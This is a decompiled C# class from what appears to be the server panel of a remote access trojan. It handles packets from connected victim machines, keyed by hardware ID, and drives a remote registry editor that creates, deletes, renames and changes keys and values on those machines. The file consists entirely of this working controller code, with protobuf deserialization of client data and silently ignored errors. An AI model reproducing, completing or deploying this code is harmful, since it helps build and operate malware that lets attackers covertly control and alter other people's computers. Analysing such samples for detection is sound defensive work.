using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using ProtoBuf;
using Server.Connection;
using Server.Forms;
using Server.Helper;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000075 RID: 117
	internal class HandleRegManager
	{
		// Token: 0x0600040E RID: 1038 RVA: 0x00025E30 File Offset: 0x00024030
		public void RegManager(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string asString = unpack_msgpack.ForcePathObject("Command").AsString;
				uint num = <PrivateImplementationDetails>.ComputeStringHash(asString);
				if (num <= 2436850624U)
				{
					if (num <= 836757040U)
					{
						if (num != 564773235U)
						{
							if (num == 836757040U)
							{
								if (asString == "RenameValue")
								{
									FormRegistryEditor formRegistryEditor = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
									if (formRegistryEditor != null)
									{
										string asString2 = unpack_msgpack.ForcePathObject("keyPath").AsString;
										string asString3 = unpack_msgpack.ForcePathObject("OldValueName").AsString;
										string asString4 = unpack_msgpack.ForcePathObject("NewValueName").AsString;
										formRegistryEditor.RenameValue(asString2, asString3, asString4);
									}
								}
							}
						}
						else if (asString == "DeleteValue")
						{
							FormRegistryEditor formRegistryEditor2 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
							if (formRegistryEditor2 != null)
							{
								string asString5 = unpack_msgpack.ForcePathObject("keyPath").AsString;
								string asString6 = unpack_msgpack.ForcePathObject("ValueName").AsString;
								formRegistryEditor2.DeleteValue(asString5, asString6);
							}
						}
					}
					else if (num != 2082903604U)
					{
						if (num == 2436850624U)
						{
							if (asString == "LoadKey")
							{
								FormRegistryEditor formRegistryEditor3 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
								if (formRegistryEditor3 != null)
								{
									string asString7 = unpack_msgpack.ForcePathObject("RootKey").AsString;
									byte[] asBytes = unpack_msgpack.ForcePathObject("Matches").GetAsBytes();
									formRegistryEditor3.AddKeys(asString7, HandleRegManager.DeSerializeMatches(asBytes));
								}
							}
						}
					}
					else if (asString == "setClient")
					{
						FormRegistryEditor formRegistryEditor4 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
						if (formRegistryEditor4 != null && formRegistryEditor4.Client == null)
						{
							client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
							formRegistryEditor4.Client = client;
							formRegistryEditor4.timer1.Enabled = true;
						}
					}
				}
				else if (num <= 2907803874U)
				{
					if (num != 2750843969U)
					{
						if (num == 2907803874U)
						{
							if (asString == "CreateValue")
							{
								FormRegistryEditor formRegistryEditor5 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
								if (formRegistryEditor5 != null)
								{
									string asString8 = unpack_msgpack.ForcePathObject("keyPath").AsString;
									string asString9 = unpack_msgpack.ForcePathObject("Kindstring").AsString;
									string asString10 = unpack_msgpack.ForcePathObject("newKeyName").AsString;
									RegistryValueKind kind = RegistryValueKind.None;
									num = <PrivateImplementationDetails>.ComputeStringHash(asString9);
									if (num <= 839689206U)
									{
										if (num <= 485174231U)
										{
											if (num != 348981803U)
											{
												if (num == 485174231U)
												{
													if (asString9 == "11")
													{
														kind = RegistryValueKind.QWord;
													}
												}
											}
											else if (asString9 == "-1")
											{
												kind = RegistryValueKind.None;
											}
										}
										else if (num != 822911587U)
										{
											if (num == 839689206U)
											{
												if (asString9 == "7")
												{
													kind = RegistryValueKind.MultiString;
												}
											}
										}
										else if (asString9 == "4")
										{
											kind = RegistryValueKind.DWord;
										}
									}
									else if (num <= 890022063U)
									{
										if (num != 873244444U)
										{
											if (num == 890022063U)
											{
												if (asString9 == "0")
												{
													kind = RegistryValueKind.Unknown;
												}
											}
										}
										else if (asString9 == "1")
										{
											kind = RegistryValueKind.String;
										}
									}
									else if (num != 906799682U)
									{
										if (num == 923577301U)
										{
											if (asString9 == "2")
											{
												kind = RegistryValueKind.ExpandString;
											}
										}
									}
									else if (asString9 == "3")
									{
										kind = RegistryValueKind.Binary;
									}
									formRegistryEditor5.CreateValue(asString8, new RegistrySeeker.RegValueData
									{
										Name = asString10,
										Kind = kind,
										Data = new byte[0]
									});
								}
							}
						}
					}
					else if (asString == "DeleteKey")
					{
						FormRegistryEditor formRegistryEditor6 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
						if (formRegistryEditor6 != null)
						{
							string asString11 = unpack_msgpack.ForcePathObject("ParentPath").AsString;
							string asString12 = unpack_msgpack.ForcePathObject("KeyName").AsString;
							formRegistryEditor6.DeleteKey(asString11, asString12);
						}
					}
				}
				else if (num != 3208646218U)
				{
					if (num != 3760340948U)
					{
						if (num == 4124725250U)
						{
							if (asString == "ChangeValue")
							{
								FormRegistryEditor formRegistryEditor7 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
								if (formRegistryEditor7 != null)
								{
									string asString13 = unpack_msgpack.ForcePathObject("keyPath").AsString;
									byte[] asBytes2 = unpack_msgpack.ForcePathObject("Value").GetAsBytes();
									formRegistryEditor7.ChangeValue(asString13, HandleRegManager.DeSerializeRegValueData(asBytes2));
								}
							}
						}
					}
					else if (asString == "CreateKey")
					{
						FormRegistryEditor formRegistryEditor8 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
						if (formRegistryEditor8 != null)
						{
							string asString14 = unpack_msgpack.ForcePathObject("ParentPath").AsString;
							byte[] asBytes3 = unpack_msgpack.ForcePathObject("Match").GetAsBytes();
							formRegistryEditor8.CreateNewKey(asString14, HandleRegManager.DeSerializeMatch(asBytes3));
						}
					}
				}
				else if (asString == "RenameKey")
				{
					FormRegistryEditor formRegistryEditor9 = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
					if (formRegistryEditor9 != null)
					{
						string asString15 = unpack_msgpack.ForcePathObject("rootKey").AsString;
						string asString16 = unpack_msgpack.ForcePathObject("oldName").AsString;
						string asString17 = unpack_msgpack.ForcePathObject("newName").AsString;
						formRegistryEditor9.RenameKey(asString15, asString16, asString17);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600040F RID: 1039 RVA: 0x000264DC File Offset: 0x000246DC
		public static RegistrySeeker.RegSeekerMatch[] DeSerializeMatches(byte[] bytes)
		{
			RegistrySeeker.RegSeekerMatch[] result;
			using (MemoryStream memoryStream = new MemoryStream(bytes))
			{
				result = Serializer.Deserialize<RegistrySeeker.RegSeekerMatch[]>(memoryStream);
			}
			return result;
		}

		// Token: 0x06000410 RID: 1040 RVA: 0x00026514 File Offset: 0x00024714
		public static RegistrySeeker.RegSeekerMatch DeSerializeMatch(byte[] bytes)
		{
			RegistrySeeker.RegSeekerMatch result;
			using (MemoryStream memoryStream = new MemoryStream(bytes))
			{
				result = Serializer.Deserialize<RegistrySeeker.RegSeekerMatch>(memoryStream);
			}
			return result;
		}

		// Token: 0x06000411 RID: 1041 RVA: 0x0002654C File Offset: 0x0002474C
		public static RegistrySeeker.RegValueData DeSerializeRegValueData(byte[] bytes)
		{
			RegistrySeeker.RegValueData result;
			using (MemoryStream memoryStream = new MemoryStream(bytes))
			{
				result = Serializer.Deserialize<RegistrySeeker.RegValueData>(memoryStream);
			}
			return result;
		}
	}
}
